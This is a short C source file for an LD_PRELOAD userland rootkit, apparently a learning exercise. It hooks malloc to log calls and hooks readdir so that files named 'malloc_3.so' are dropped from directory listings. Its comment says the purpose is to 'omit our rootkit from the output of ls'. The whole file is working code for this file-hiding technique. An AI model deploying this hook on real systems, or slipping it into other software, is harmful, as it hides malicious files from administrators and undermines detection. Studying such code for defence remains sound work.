#define _GNU_SOURCE

#include <dlfcn.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <dirent.h>


#define FILENAME "malloc_3.so"

//function pointer to the original malloc, initialized to NULL
static void* (*original_malloc)(size_t) = NULL;

//hook for malloc
void *malloc(size_t size)
{
    if (original_malloc == NULL)
    {
        //finds the address of the next occurence of "malloc"
        original_malloc = dlsym(RTLD_NEXT, "malloc");
    }

    fprintf(stderr, "[3] Hooked libc function call: malloc(%ld)\n", size);

    //perform the functionality of the real malloc function
    void *allocation = NULL;
    allocation = original_malloc(size);

    return allocation;
}

//omit our rootkit from the output of ls
//function pointer to the original write, initialized to NULL
/** dirent structure
* struct dirent {
*               ino_t          d_ino;       / Inode number /
*               off_t          d_off;       / Not an offset; see below /
*               unsigned short d_reclen;    / Length of this record /
*               unsigned char  d_type;      / Type of file; not supported
*                                              by all filesystem types /
*               char           d_name[256]; / Null-terminated filename /
*           };
**/

//function pointer to the original readdir
struct dirent* (*original_readdir)(DIR *) = NULL;

struct dirent *readdir(DIR *dirp)
{
    if (original_readdir == NULL)
    {
        //finds the offset of the next occurence of readdir
        original_readdir = dlsym(RTLD_NEXT, "readdir");
    }

    struct dirent *results = original_readdir(dirp);
    while (results != NULL && !strncmp(results->d_name, FILENAME, strlen(FILENAME)))
    {
        //move onto the next entry in the stream
        results = original_readdir(dirp);
    }

    return results;
}